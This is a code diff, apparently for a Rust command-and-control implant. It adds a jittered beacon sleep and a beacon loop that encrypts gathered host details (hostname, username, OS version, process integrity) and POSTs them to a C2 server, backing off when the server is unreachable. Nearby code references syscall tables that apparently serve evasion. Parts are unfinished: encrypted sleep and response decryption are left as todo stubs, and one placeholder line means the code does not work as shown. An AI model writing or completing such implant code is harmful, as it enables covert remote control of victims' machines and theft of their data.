@@ -2,6 +2,7 @@ use core::ffi::c_void;
 
 use crate::core::net::json::JsonWriter;
 use crate::core::net::transport::HttpSession;
+use crate::core::net::crypto;
 use crate::debug;
 use crate::core::{invoke, ssn_table};
 
@@ -272,6 +273,30 @@ unsafe fn gather_sysinfo() -> SysInfo {
     SysInfo { hostname, username, os_version, pid, process_name, arch: "x64", integrity }
 }
 
+unsafe fn beacon_sleep(base_ms: u64, jitter_pct: u8) {
+    let actual_ms = if jitter_pct > 0 {
+        let tsc: u64;
+        core::arch::asm!(
+            "rdtsc", 
+            "shl rdx, 32", 
+            "or rax, rdx", 
+            out("rax") tsc, 
+            out("rdx") _
+        );
+        let jitter_range = base_ms * jitter_pct as u64 / 100;
+        let offset = tsc % (jitter_range * 2 + 1);
+        base_ms - jitter_range + offset 
+    } else {
+        base_ms
+    };
+
+    let delay: i64 = -((actual_ms as i64) * 10000);
+    debug!("[BEACON] Sleeping {}ms", actual_ms);
+
+    // TODO: implement encrypted sleep
+    unimplemented!()
+}
+
 pub unsafe fn beacon_loop(config: &C2Config) {
     if !ssn_table::initialize_network() {
         return;
@@ -316,8 +341,25 @@ pub unsafe fn beacon_loop(config: &C2Config) {
         // Encrypt 
         let encrypted = crypto::aes256_gcm_encrypt(&key, &beacon_json);
 
+        // POST to /api/beacon
+        match session.post(&beacon_path, &encrypted) {
+            Some(response_data) => {
+                debug!("[BEACON] Response recived ({} bytes)", response_data.len());
+
+                // Decrypt response
+                if let Some(plaintext) = Some(0) { //crypto::aes256_gcm_dencrypt(&key, &response_data) {
+                    todo!()
+                }
+            }
+            None => {
+                debug!("[BEACON] POST failed, server unreachable");
+                interval = core::cmp::min(interval * 2, 300000); // On failure, back off (double interval, max 5 min)
+            }
+        }
+
+        // Sleep with jitter
+        beacon_sleep(interval, jitter)
     }
-    unimplemented!()
 }
 
 fn wide_to_string(wide: &[u16]) -> String {
